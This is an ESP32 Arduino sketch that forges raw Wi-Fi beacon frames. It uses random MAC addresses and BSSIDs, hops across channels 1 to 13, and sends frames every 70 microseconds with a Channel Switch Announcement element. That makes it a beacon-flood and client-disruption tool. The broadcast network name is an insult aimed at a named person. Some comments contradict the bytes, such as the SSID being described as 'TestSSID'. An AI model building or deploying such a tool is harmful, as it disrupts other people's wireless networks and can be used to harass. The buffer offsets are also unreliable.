#include <Arduino.h>
#include <esp_wifi.h>
#include <esp_event.h>
#include <nvs_flash.h>
#include <esp_task_wdt.h>

int ch = 1;

// Beacon Packet buffer
uint8_t packet[128] = {
  0x80, 0x00, 0x00, 0x00, // Frame Control
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: broadcast
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: will be filled by hardware
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: will be filled by hardware
  0x00, 0x00, // Sequence Control
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp (to be set by hardware)
  0x64, 0x00, // Beacon interval (example value)
  0x01, 0x04, // Capability info (example value)
  0x00, 0x08, // SSID tag number and length (8 bytes for "TestSSID")
  'H', 'a', 'o', ' ', 'g', 'a', 'y', ' ', // SSID
  0x01, // Supported rates
  0x01, 0x01, 0x04, // DS Parameter set (channel number will be set dynamically)
  
  // WPA3 RSN Element
  0x30, 0x14, // RSN tag and length
  0x01, 0x00, // RSN Version
  0x00, 0x0F, 0xAC, 0x04, // Group Cipher Suite (WPA3 CCMP)
  0x01, 0x00, // Pairwise Cipher Suite count
  0x00, 0x0F, 0xAC, 0x04, // Pairwise Cipher Suite (WPA3 CCMP)
  0x01, 0x00, // Authentication Key Management (AKM) Suite count
  0x00, 0x0F, 0xAC, 0x08, // Authentication Key Management (WPA3 SAE)
  0x00, 0x00, // RSN Capabilities

  // Channel Switch Announcement (CSA) Element
  0x25, 0x03, // Channel Switch Announcement tag and length
  0x01,       // Switch Mode (1: Switch after CSA count reaches 0)
  0x00,       // Channel number (will be set dynamically)
  0x01        // CSA count (1 beacon frame before switch)
};

void setup() {
  esp_task_wdt_init(6000, false);
  nvs_flash_init();
  tcpip_adapter_init();
  ESP_ERROR_CHECK(esp_event_loop_create_default());
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  ESP_ERROR_CHECK(esp_wifi_init(&cfg));
  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
  ESP_ERROR_CHECK(esp_wifi_start());
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
}

void loop() {
  // Switch channel dynamically
  ch = (ch % 13) + 1;

  // Update random source and BSSID
  for (int i = 10; i <= 21; i++) {
    packet[i] = random(256);
  }

  // Set the DS Parameter Set to current channel
  packet[56] = ch;

  // Update CSA Element with the new channel
  packet[77] = ch; // Channel switch to the next channel

  // Send the custom beacon packet with WPA3 and CSA elements
  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);

  // Delay for 70 microseconds before sending the next frame
  delayMicroseconds(70);
}
